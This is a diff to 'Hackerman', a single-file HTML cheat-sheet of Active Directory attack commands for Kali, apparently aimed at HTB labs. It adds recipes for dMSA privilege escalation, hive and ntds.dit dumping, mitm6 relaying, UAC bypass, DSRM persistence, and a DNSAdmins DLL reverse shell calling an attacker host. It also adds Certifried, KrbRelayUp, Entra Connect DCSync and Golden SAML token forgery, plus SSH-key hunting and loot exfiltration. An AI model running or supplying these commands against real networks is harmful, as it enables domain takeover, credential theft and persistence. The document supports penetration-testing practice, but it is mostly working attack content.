@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Hackerman v1.3.0 — AD Attack Helper (Kali · HTB)</title>
+<title>Hackerman v1.4.0 — AD Attack Helper (Kali · HTB)</title>
 <style>
 :root{
   --bg:#0a0f1a; --panel:#0f1729; --panel2:#131d33; --line:#1e2b45;
@@ -203,7 +203,7 @@ kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2p
 
 <header>
   <div class="hwrap">
-    <div class="brand">Hackerman <b>v1.3.0</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
+    <div class="brand">Hackerman <b>v1.4.0</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
     <div class="hactions">
       <select id="presetSel" title="Load preset"><option value="">— presets —</option></select>
       <button id="presetSave" title="Save current context as preset">Save</button>
@@ -257,7 +257,7 @@ kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2p
   <section id="tab-legend" class="tab"></section>
 </main>
 
-<footer class="mono">Hackerman v1.3.0 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
+<footer class="mono">Hackerman v1.4.0 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
 
 <div id="focusOverlay" class="hidden">
   <div id="focusBox" role="dialog" aria-modal="true" tabindex="-1" aria-label="recipe focus">
@@ -1057,7 +1057,7 @@ function renderLegend(){
   const tab = $('#tab-legend');
   tab.innerHTML = '';
   const about = document.createElement('div');
-  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v1.3.0</h2>' +
+  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v1.4.0</h2>' +
     '<p class="dim">Single-file Active Directory attack helper for Kali, built by <b>@bongoalex</b> with <b>deepseek</b>. ' +
     RECIPES.length + ' recipes · ' + FLOWS.length + ' wizard flows · ' + CYPHER.length + ' BloodHound queries. Offline, no dependencies, no telemetry.</p>' +
     '<p class="dim">Use only for authorized testing (HTB labs, your own infrastructure, signed engagements). Syntax is version-sensitive — cross-check against your target versions.</p>';
@@ -1349,6 +1349,7 @@ cmds:[
  [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' --groups`,'domain groups'],
  [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' --pass-pol`,'password policy (lockout!)'],
  [`impacket-GetADUsers -all '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'impacket user dump'],
+ [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' --rid-brute`,'RID cycling (works over null/guest sessions too)'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --trusted-for-delegation`,'unconstrained delegation accounts']
 ],note:'Check the lockout threshold before spraying — <b>thehacker.recipes</b> has the spray rules of thumb.'});
 
@@ -1358,6 +1359,7 @@ cmds:[
  [`nxc smb {{dc_ip}} -u '' -p '' --shares`,'null session shares'],
  [`nxc smb {{dc_ip}} -u 'guest' -p '' --users`,'guest session'],
  [`nxc ldap {{dc_ip}} -u '' -p ''`,'LDAP bind check'],
+ [`nxc smb {{dc_ip}} -u 'guest' -p '' --rid-brute 10000`,'RID brute via guest session'],
  [`rpcclient -U '' -N {{dc_ip}} -c 'enumdomusers'`,'RPC user enum']
 ],note:'Null sessions are rare on modern DCs but cheap to try. <span class="mono">enumdomusers</span> failures often still leak the domain SID via <span class="mono">lookupsid</span>.'});
 
@@ -1467,6 +1469,16 @@ cmds:[
  [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get dnsDump --zone {{domain}}`,'AD DNS records'],
  [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get bloodhound --path {{hashfile}}`,'bloodyAD BloodHound collector (basic)']
 ],note:'<span class="mono">get writable ./ get trusts</span> are the two commands to run on any new credential — they often beat a full BloodHound run for speed.'});
+
+R({id:'bloodyad-badsuccessor',cat:'bloodyad',title:'bloodyAD — BadSuccessor (dMSA privilege escalation)',desc:'Windows Server 2025 introduced delegated MSAs. A dMSA linked to a privileged account inherits its rights — bloodyAD can create and link one.',
+cmds:[
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap badsuccessor_check`,'check if the domain still allows the BadSuccessor path'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add badSuccessor 'evil' -t 'CN={{target_user}},CN=Users,{{domain_dn}}'`,'create dMSA evil$ linked to a privileged account'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap dmsas`,'list dMSAs and their state'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object 'evil$' --attr msDS-ManagedPassword,msDS-ManagedAccountPrecededByLink`,'read the dMSA managed password and link'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap gmsa`,'decrypt readable managed passwords (KDS)'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap deluser 'CN=evil,CN=Managed Service Accounts,{{domain_dn}}'`,'CLEANUP: delete the dMSA']
+],note:'BadSuccessor (2025): any principal with create-child rights could create a dMSA and set <span class="mono">msDS-ManagedAccountPrecededByLink</span> to a privileged account — the dMSA then inherits that account permissions. <span class="mono">badsuccessor_check</span> reports whether the domain still allows it (patched builds require rights on the target). Adjust the target/OU DNs, and use the <span class="mono">gmsa</span> helper when the managed password is readable.'});
 
 /* ===== KERBEROS ===== */
 R({id:'keytab',cat:'krb',title:'Keytab → NTLM / AES keys',desc:'Found /etc/krb5.keytab on a Linux box or in a looted backup? Extract the machine account secrets.',
@@ -1991,6 +2003,7 @@ cmds:[
  [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_host}}$' --attr ms-Mcs-AdmPwd`,'bloodyAD LAPS read'],
  [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} get object '{{target_host}}$' --attr ms-Mcs-AdmPwd`,'LAPS via ccache'],
  [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object 'gmsaAccount$' --attr msDS-ManagedPassword`,'bloodyAD gMSA read'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_host}}$' --attr msLAPS-Password,ms-Mcs-AdmPwd`,'legacy + Windows LAPS v2 password'],
  [`nxc smb {{target_host}} -u '{{target_user}}' -p '<LAPS password>' --local-auth`,'use the LAPS password']
 ],note:'Windows LAPS (2023+) uses <span class="mono">msLAPS-Password</span> instead of <span class="mono">ms-Mcs-AdmPwd</span>. gMSA read rights are granted per-account (<span class="mono">PrincipalsAllowedToRetrieveManagedPassword</span>).'});
 
@@ -2013,6 +2026,8 @@ cmds:[
  [`crontab -l; ls -la /etc/cron* 2>/dev/null`,'cron jobs','n'],
  [`tar czf /tmp/loot.tgz /etc/krb5.keytab /tmp/*.ccache 2>/dev/null`,'package Kerberos material','n'],
  [`export KRB5CCNAME=/path/to/stolen.ccache && klist`,'use a stolen ccache','n'],
+ [`find / -xdev -readable \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' \\) 2>/dev/null`,'hunt SSH keys','n'],
+ [`ssh -i id_rsa -o StrictHostKeyChecking=no user@target`,'reuse found keys for lateral movement'],
  [`scp user@target:/tmp/loot.tgz .`,'pull the loot to Kali']
 ],note:'<span class="mono">/etc/krb5.keytab</span> → use the KeyTabExtract recipe (machine account AES/NTLM). Stolen <span class="mono">.ccache</span> files work directly via KRB5CCNAME. Also check service configs for DB/app passwords and <span class="mono">id_rsa</span> keys in home directories.'});
 
@@ -2026,6 +2041,18 @@ cmds:[
  [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' -M gpp_password`,'GPP cpassword in SYSVOL'],
  [`runas /savecred /user:{{domain}}\\{{target_user}} cmd.exe`,'use saved creds (target-side)','n']
 ],note:'<span class="mono">cmdkey /list</span> + <span class="mono">runas /savecred</span> is a classic combo. AutoLogon stores <span class="mono">DefaultPassword</span> in cleartext. Also check backup scripts, <span class="mono">web.config</span>, <span class="mono">*.ps1</span> on shares (spider_plus loot).'});
+
+R({id:'sebackup',cat:'creds',title:'SeBackupPrivilege — copy hives and ntds.dit',desc:'Backup Operators (or an enabled SeBackupPrivilege) can read any file — dump SAM/SYSTEM/SECURITY and even ntds.dit.',
+cmds:[
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive && reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.hive'`,'save the hives'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --get-file 'C:\\Windows\\Temp\\sam.hive' /tmp/sam.hive`,'pull SAM'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --get-file 'C:\\Windows\\Temp\\system.hive' /tmp/system.hive`,'pull SYSTEM'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --get-file 'C:\\Windows\\Temp\\security.hive' /tmp/security.hive`,'pull SECURITY'],
+ [`impacket-secretsdump -sam /tmp/sam.hive -system /tmp/system.hive -security /tmp/security.hive LOCAL`,'parse the hives offline'],
+ [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' -x 'robocopy /b C:\\Windows\\NTDS C:\\Windows\\Temp ntds.dit && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive'`,'DC: copy ntds.dit with backup semantics'],
+ [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' --get-file 'C:\\Windows\\Temp\\ntds.dit' /tmp/ntds.dit`,'pull ntds.dit'],
+ [`impacket-secretsdump -ntds /tmp/ntds.dit -system /tmp/system.hive LOCAL`,'all domain hashes offline']
+],note:'<span class="mono">reg save</span> already works for normal admins; SeBackup matters for Backup Operators without full admin. The ntds.dit copy usually needs <span class="mono">robocopy /b</span> (backup semantics) or a VSS snapshot via <span class="mono">diskshadow</span> because the file is locked — see the offline-ntds recipe. Remove the hives from C:\\Windows\\Temp afterwards.'});
 
 /* ===== POISONING & RELAY ===== */
 R({id:'relay-responder',cat:'relay',title:'Responder — LLMNR/NBT-NS/mDNS poisoning',desc:'Catch NTLM hashes on the wire when DNS fails. First move with no creds.',
@@ -2051,7 +2078,9 @@ cmds:[
  [`impacket-ntlmrelayx -t ldap://{{dc_host}} -smb2support`,'probe LDAP relay','n'],
  [`impacket-ntlmrelayx -t ldaps://{{dc_host}} --escalate-user '{{user}}' -smb2support`,'escalate user to DCSync','n'],
  [`impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -just-dc`,'use the granted rights'],
- [`impacket-ntlmrelayx -t ldaps://{{dc_host}} --add-computer '{{computer_name}}' '{{computer_pass}}' -smb2support`,'add a machine account','n']
+ [`impacket-ntlmrelayx -t ldaps://{{dc_host}} --add-computer '{{computer_name}}' '{{computer_pass}}' -smb2support`,'add a machine account','n'],
+ [`impacket-ntlmrelayx -t ldaps://{{dc_host}} -i --no-smb-server`,'interactive LDAP shell on the relayed session','n'],
+ [`impacket-ntlmrelayx -t ldaps://{{dc_host}} --dump-laps --dump-gmsa -smb2support`,'dump readable LAPS/gMSA passwords','n']
 ],note:'LDAPS relay works even with channel binding unless EPA is enforced; LDAP relay needs signing not required. Coerce a DC/service with PetitPotam/PrinterBug to trigger the auth first.'});
 
 R({id:'relay-rbcd',cat:'relay',title:'ntlmrelayx — RBCD via relay',desc:'No write rights? Let the relay create the machine and set delegation for you.',
@@ -2079,6 +2108,15 @@ cmds:[
  [`impacket-petitpotam '{{domain}}/{{user}}:{{password}}@{{target_host}}' {{attacker_ip}}`,'EFSRPC'],
  [`impacket-dfscoerce '{{domain}}/{{user}}:{{password}}@{{target_host}}' '{{domain}}/{{dc_host}}'`,'DFS coerce']
 ],note:'Combine with Responder/ntlmrelayx (<span class="mono">-M coerce_plus -o LISTENER={{attacker_ip}}</span> triggers and relays) or with an unconstrained-delegation host you own. Cheapest auth coercion on modern boxes is usually PetitPotam or DFSCoerce.'});
+
+R({id:'mitm6',cat:'relay',title:'mitm6 — IPv6 DNS takeover + relay',desc:'When LLMNR/NBT-NS are quiet: take over DNS via DHCPv6 and relay the authentication that follows.',
+cmds:[
+ [`sudo mitm6 -d {{domain}} -i {{iface}}`,'answer DHCPv6 and spoof DNS (attacker)','ns'],
+ [`impacket-ntlmrelayx -6 -wh {{attacker_ip}} -t ldaps://{{dc_host}} --escalate-user '{{user}}' -smb2support`,'relay to LDAPS and grant DCSync','n'],
+ [`impacket-ntlmrelayx -6 -wh {{attacker_ip}} -t ldaps://{{dc_host}} --delegate-access -smb2support`,'RBCD via relay instead','n'],
+ [`impacket-ntlmrelayx -6 -wh {{attacker_ip}} -tf targets.txt -socks -smb2support`,'collect sessions for proxychains','n'],
+ [`impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -just-dc`,'use the escalated rights after a successful relay']
+],note:'mitm6 becomes the IPv6 DNS server and answers WPAD lookups, so clients authenticate to your host; ntlmrelayx forwards that to LDAP(S). Works best with <span class="mono">-wh</span> pointing at the attacker IP. Mitigations that kill it: disable IPv6, enforce LDAP signing/channel binding, block WPAD.'});
 
 /* ===== LATERAL MOVEMENT ===== */
 R({id:'lat-winrm',cat:'lateral',title:'WinRM — remote shell',desc:'5985/5986 shell with creds, hash or Kerberos ticket. Your favorite nxc first.',
@@ -2143,6 +2181,20 @@ cmds:[
  [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -X 'iwr http://{{attacker_ip}}:{{lport}}/tool.exe -OutFile C:\\Windows\\Temp\\tool.exe'`,'PowerShell download'],
  [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'copy \\\\{{attacker_ip}}\\share\\tool.exe C:\\Windows\\Temp\\tool.exe'`,'copy from SMB share']
 ],note:'If egress is filtered, SMB share or WinRM upload are the fallbacks. For reverse shells: <span class="mono">nc -lvnp {{lport}}</span> on Kali and a base64 PowerShell payload on target.'});
+
+R({id:'lat-impacket-extras',cat:'lateral',title:'Impacket extras — dcomexec, services, reg',desc:'DCOM execution, remote service/registry manipulation and RDP checks as alternatives when SMB exec or WMI is blocked.',
+cmds:[
+ [`impacket-dcomexec -object MMC20 '{{domain}}/{{user}}:{{password}}@{{target_host}}'`,'DCOM exec via MMC20.Application'],
+ [`impacket-dcomexec -object ShellWindows '{{domain}}/{{user}}:{{password}}@{{target_host}}'`,'DCOM via ShellWindows'],
+ [`impacket-dcomexec -object ShellBrowserWindow '{{domain}}/{{user}}:{{password}}@{{target_host}}'`,'DCOM via ShellBrowserWindow'],
+ [`impacket-dcomexec -object MMC20 -hashes ':{{nthash}}' '{{domain}}/{{user}}@{{target_host}}'`,'DCOM via PtH'],
+ [`impacket-services '{{domain}}/{{user}}:{{password}}@{{target_host}}' list`,'list services (spot unquoted paths)'],
+ [`impacket-services '{{domain}}/{{user}}:{{password}}@{{target_host}}' create -name evil -display Evil -path 'C:\\Windows\\Temp\\evil.exe'`,'create a service (runs as SYSTEM)'],
+ [`impacket-services '{{domain}}/{{user}}:{{password}}@{{target_host}}' start -name evil`,'start the service'],
+ [`impacket-reg '{{domain}}/{{user}}:{{password}}@{{target_host}}' query -keyName 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'`,'remote registry query'],
+ [`impacket-reg '{{domain}}/{{user}}:{{password}}@{{target_host}}' save -keyName 'HKLM\\SAM' -o 'C:\\Windows\\Temp\\SAM'`,'remote registry save (admin)'],
+ [`impacket-rdpcheck '{{domain}}/{{user}}:{{password}}@{{target_host}}'`,'check RDP and NLA status']
+],note:'DCOM needs local admin and the DCOM services enabled — MMC20 usually works, ShellWindows/ShellBrowserWindow are fallbacks. <span class="mono">services create/start</span> leaves artifacts; prefer <span class="mono">change -path</span> on an existing service when possible. Community tools also use these primitives for local privesc (unquoted service paths).'});
 
 /* ===== POST-EXPLOITATION ===== */
 R({id:'post-seimpersonate',cat:'post',title:'SeImpersonate / SeAssignPrimaryToken → SYSTEM',desc:'IIS/MSSQL/service shells usually hold these — potato tools get you SYSTEM.',
@@ -2250,6 +2302,81 @@ cmds:[
  [`python3 sccmhunter.py dpapi -d {{domain}} -u '{{user}}' -p '{{password}}' -target <PXE_DP> -method disk`,'extract NAA secrets']
 ],note:'Signing-less site systems + coercion = database takeover. Alternatives: <span class="mono">SharpSCCM.exe</span> (Windows), <span class="mono">sccmsqlclient</span> for direct DB work. Client Push accounts and Network Access Accounts (NAA) are the high-value secrets. Add <span class="mono">-ldaps</span>/<span class="mono">-resolve</span> when needed.'});
 
+R({id:'uac-bypass',cat:'post',title:'UAC bypass (fodhelper / eventvwr / computerdefaults)',desc:'From a medium-integrity shell: auto-elevating Windows binaries read HKCU keys you can write.',
+cmds:[
+ [`nxc winrm {{target_host}} -u '{{user}}' -p '{{password}}' -x 'reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /d "cmd /c start C:\\Windows\\System32\\cmd.exe" /f'`,'fodhelper: command key'],
+ [`nxc winrm {{target_host}} -u '{{user}}' -p '{{password}}' -x 'reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /v DelegateExecute /t REG_SZ /f'`,'fodhelper: DelegateExecute value'],
+ [`nxc winrm {{target_host}} -u '{{user}}' -p '{{password}}' -x 'C:\\Windows\\System32\\fodhelper.exe'`,'trigger → high-integrity shell'],
+ [`nxc winrm {{target_host}} -u '{{user}}' -p '{{password}}' -x 'reg add "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" /d "cmd /c start C:\\Windows\\System32\\cmd.exe" /f && C:\\Windows\\System32\\eventvwr.exe'`,'eventvwr variant'],
+ [`nxc winrm {{target_host}} -u '{{user}}' -p '{{password}}' -X 'Start-Process C:\\Windows\\System32\\computerdefaults.exe'`,'computerdefaults variant (same ms-settings key)'],
+ [`nxc winrm {{target_host}} -u '{{user}}' -p '{{password}}' -x 'reg delete "HKCU\\Software\\Classes\\ms-settings" /f'`,'CLEANUP']
+],note:'Auto-elevating binaries resolve HKCU classes first; the spawned process runs high-integrity. Newer builds patched some binaries — if fodhelper fails try eventvwr, sdclt or a COM-based bypass. This is Medium→High only: combine with credential dumping (SAM/LSASS) and local admin checks afterwards.'});
+
+R({id:'dsrm',cat:'post',title:'DSRM — DC local admin persistence',desc:'Local admin on a DC? The DSRM Administrator hash allows network logon as the DC local Administrator.',
+cmds:[
+ [`impacket-secretsdump -sam SAM -system SYSTEM LOCAL`,'DSRM hash = local Administrator NT hash'],
+ [`nxc smb {{dc_host}} -u Administrator -H '<DSRM_HASH>' --local-auth`,'verify network logon as DC\\Administrator'],
+ [`impacket-psexec -hashes ':<DSRM_HASH>' '{{dc_host}}/Administrator@{{dc_ip}}'`,'semi-interactive PtH with the DSRM hash'],
+ [`reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f`,'allow DSRM network logon (target-side, if blocked)','n'],
+ [`# Windows alternative: mimikatz lsadump::setntlm / set the hash to a known value`,'persistence variant','n']
+],note:'DSRM is local to the DC and needs <span class="mono">DsrmAdminLogonBehavior</span> = 2 for network logon (older builds may block it). Classic flow: dump DSRM with local admin → log in as <span class="mono">DC\\Administrator</span> → reset DSRM to a known hash for persistence. Restore the original hash when done. Windows-side equivalent: mimikatz <span class="mono">lsadump::dsrm</span> + <span class="mono">sekurlsa::pth /domain:&lt;DC&gt;</span>.'});
+
+R({id:'dnsadmins',cat:'post',title:'DNSAdmins — plugin DLL to SYSTEM on the DC',desc:'Members of DNSAdmins can point the DNS service at a DLL of their choice and restart it — code runs as SYSTEM on the DC.',
+cmds:[
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --groups | grep -i dnsadmins`,'check membership'],
+ [`msfvenom -p windows/x64/shell_reverse_tcp LHOST={{attacker_ip}} LPORT={{lport}} -f dll -o /tmp/dns.dll`,'build a DLL payload','n'],
+ [`impacket-smbserver share /tmp -smb2support`,'serve the DLL (no proxy)','ns'],
+ [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' -x 'dnscmd {{dc_host}} /config /serverlevelplugindll \\\\{{attacker_ip}}\\share\\dns.dll'`,'point DNS at your DLL'],
+ [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' -x 'sc.exe stop dns'`,'stop DNS (brief outage)'],
+ [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' -x 'sc.exe start dns'`,'start DNS → DLL loads as SYSTEM'],
+ [`nc -lvnp {{lport}}`,'catch the callback','ns'],
+ [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' -x 'dnscmd {{dc_host}} /config /serverlevelplugindll ""'`,'CLEANUP: clear the plugin']
+],note:'Restarting DNS briefly breaks name resolution — lab only or with change approval. A reboot also loads the plugin. Requires membership in DNSAdmins plus write access to the DC (usually via admin share) to run <span class="mono">dnscmd</span>. Detection: unencrypted DLL load + DNS service restart events.'});
+
+R({id:'cve-certifried',cat:'post',title:'CVE-2022-26923 — Certifried (machine account spoofing)',desc:'Take over a computer account, point its dNSHostName at the DC and request a Machine certificate — then authenticate as the DC.',
+cmds:[
+ [`impacket-addcomputer -method SAMR -computer-name '{{computer_name}}' -computer-pass '{{computer_pass}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'own or create a machine account'],
+ [`certipy account -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -user '{{computer_name}}' update -dns '{{dc_fqdn}}'`,'set dNSHostName to the DC FQDN'],
+ [`certipy req -u '{{computer_name}}@{{domain}}' -p '{{computer_pass}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template Machine`,'request a Machine certificate as the spoofed DC'],
+ [`certipy auth -pfx '{{dc_host}}.pfx' -dc-ip {{dc_ip}}`,'PKINIT → DC TGT + NT hash'],
+ [`certipy account -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -user '{{computer_name}}' update -dns ''`,'CLEANUP: reset dNSHostName'],
+ [`impacket-addcomputer -method SAMR -computer-name '{{computer_name}}' -delete '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'CLEANUP: delete the machine account']
+],note:'Patched since May 2022 (KB5014754): patched CAs embed the SID security extension, so the certificate carries your machine SID and the DC login fails. Quick check: request a <span class="mono">User</span> certificate with certipy — if the output prints <span class="mono">Certificate object SID</span>, the environment is patched. Older bloodyAD syntax for the spoof: <span class="mono">set object &lt;DN&gt; dNSHostName -v &lt;dc.fqdn&gt;</span>. If certipy rejects the machine name, try it without the trailing <span class="mono">$</span>.'});
+
+R({id:'krbrelay',cat:'post',title:'KrbRelayUp — local SYSTEM via Kerberos relay',desc:'Relay the local machine account Kerberos auth to LDAP and abuse RBCD or shadow credentials to spawn a SYSTEM service (needs LDAP signing off).',
+cmds:[
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'certutil -urlcache -f http://{{attacker_ip}}:{{lport}}/KrbRelayUp.exe C:\\Windows\\Temp\\KrbRelayUp.exe'`,'deliver the binary'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'C:\\Windows\\Temp\\KrbRelayUp.exe full -d {{domain}} -cn {{computer_name}} -cp {{computer_pass}} -i {{target_user}}'`,'full chain → SYSTEM service'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'C:\\Windows\\Temp\\KrbRelayUp.exe relay -d {{domain}} -cn {{computer_name}} -c -cp {{computer_pass}}'`,'phase 1: relay to LDAP (RBCD)'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'C:\\Windows\\Temp\\KrbRelayUp.exe spawn -d {{domain}} -cn {{computer_name}} -cp {{computer_pass}} -i {{target_user}}'`,'phase 2: spawn SYSTEM service'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'C:\\Windows\\Temp\\KrbRelayUp.exe relay -d {{domain}} -m shadowcred'`,'shadow credentials variant (no machine account)'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'C:\\Windows\\Temp\\KrbRelayUp.exe relay -d {{domain}} -m adcs -ca {{ca_host}}'`,'ADCS web enrollment variant (works with LDAP signing enforced)']
+],note:'Requires LDAP signing not enforced (default) or the ADCS variant, MachineAccountQuota > 0 (or an existing machine account) and a local admin to impersonate. Windows-only tool: download from the Dec0ne/KrbRelayUp releases, serve it and run through nxc/WinRM. Essentially a no-fix local privilege escalation from any domain user with a foothold.'});
+
+R({id:'entra-connect',cat:'post',title:'Entra ID Connect — MSOL/ADSync account abuse',desc:'Hybrid identity: the Azure AD Connect server stores the AD DS connector account (MSOL_*) whose password gives DCSync rights.',
+cmds:[
+ [`ldapsearch -x -H ldap://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{domain_dn}}' '(sAMAccountName=MSOL_*)' sAMAccountName,description,distinguishedName`,'find the AD DS connector account'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --query '(sAMAccountName=MSOL_*)' sAMAccountName,servicePrincipalName`,'nxc variant (version dependent)'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'dir "C:\\Program Files\\Microsoft Azure AD Sync\\Data"'`,'locate the ADSync database on the sync server'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M spider_plus`,'spider shares for sync configs and scripts'],
+ [`roadrecon auth -u '{{user}}@{{domain}}' -p '{{password}}'`,'authenticate ROADtools against Entra ID'],
+ [`roadrecon gather`,'enumerate tenant users, groups, apps and roles'],
+ [`roadrecon gui`,'browse the collected data locally','n'],
+ [`impacket-secretsdump '{{domain}}/<MSOL_ACCOUNT>:<PASSWORD>@{{dc_host}}' -just-dc`,'DCSync with the connector account']
+],note:'The MSOL_* connector account usually holds <span class="mono">Replicating Directory Changes</span>. Its password lives on the AD Connect server in the ADSync database (WID/SQL) or via <span class="mono">Get-AADIntSyncCredentials</span> (AADInternals, Windows). Cloud side: ROADtools/AADInternals with credentials or a stolen refresh token. Also check ADFS (separate card) and password hash sync as alternative persistence.'});
+
+R({id:'adfs-goldensaml',cat:'post',title:'AD FS — Golden SAML (token signing key)',desc:'Compromise the ADFS server, extract the token-signing key and forge SAML tokens for any federated app — MFA included.',
+cmds:[
+ [`git clone https://github.com/mandiant/ADFSDump.git && git clone https://github.com/mandiant/ADFSpoof.git && pip3 install -r ADFSpoof/requirements.txt`,'get ADFSDump (build the exe) and ADFSpoof','n'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --put-file /tmp/ADFSDump.exe 'C:\\Windows\\Temp\\ADFSDump.exe'`,'upload ADFSDump to the ADFS server'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'C:\\Windows\\Temp\\ADFSDump.exe > C:\\Windows\\Temp\\adfs.txt'`,'dump DKM key + encrypted signing cert'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --get-file 'C:\\Windows\\Temp\\adfs.txt' /tmp/adfs.txt`,'pull the dump'],
+ [`echo '<BASE64_ENCRYPTED_PFX>' | base64 -d > /tmp/EncryptedPfx.bin`,'convert the PFX blob'],
+ [`echo '<HEX_DKM_KEY>' | xxd -r -p > /tmp/DkmKey.bin`,'convert the DKM key'],
+ [`python3 ADFSpoof/ADFSpoof.py -b /tmp/EncryptedPfx.bin /tmp/DkmKey.bin dump --path /tmp/adfs_signing.pfx`,'decrypt the signing certificate'],
+ [`python3 ADFSpoof/ADFSpoof.py -b /tmp/EncryptedPfx.bin /tmp/DkmKey.bin -s '{{target_fqdn}}' saml2 --endpoint 'https://{{target_fqdn}}/adfs/ls/IdpInitiatedSignOn.aspx' --nameidformat urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress --nameid '{{target_user}}@{{domain}}' --rpidentifier '<RP_IDENTIFIER>' --assertions '<CLAIMS>'`,'forge a SAML token for the relying party']
+],note:'Run ADFSDump as the ADFS service account (or pass <span class="mono">/user: /password: /domain: /server:</span>); it is a C# tool, so build it once with Visual Studio (or use a prebuilt release). The encrypted token-signing certificate and DKM key come from the ADFS configuration database (WID pipe). Forged tokens survive password changes, bypass MFA and stay valid until the token-signing certificate is rotated — try every DKM key if there are several master keys. Office 365 target: <span class="mono">o365 --upn user@domain --objectguid &lt;GUID&gt;</span>.'});
+
 /* ===== MSSQL ===== */
 R({id:'mssql-connect',cat:'mssql',title:'Connect to MSSQL',desc:'impacket-mssqlclient / nxc variants with password, hash or Kerberos.',
 cmds:[
@@ -2331,6 +2458,7 @@ cmds:[
  [`bloodhound-python -u '{{user}}' -p '{{password}}' -d {{domain}} -ns {{dc_ip}} -c All --zip`,'password'],
  [`bloodhound-python -u '{{user}}' --hashes ':{{nthash}}' -d {{domain}} -ns {{dc_ip}} -c All --zip`,'NT hash'],
  [`KRB5CCNAME={{ccache}} bloodhound-python -u '{{user}}' -k -no-pass -d {{domain}} -ns {{dc_ip}} -c All --zip`,'Kerberos ccache'],
+ [`bloodhound-ce-python -u '{{user}}' -p '{{password}}' -d {{domain}} -ns {{dc_ip}} -c All --zip`,'BloodHound CE collector (newer package name)'],
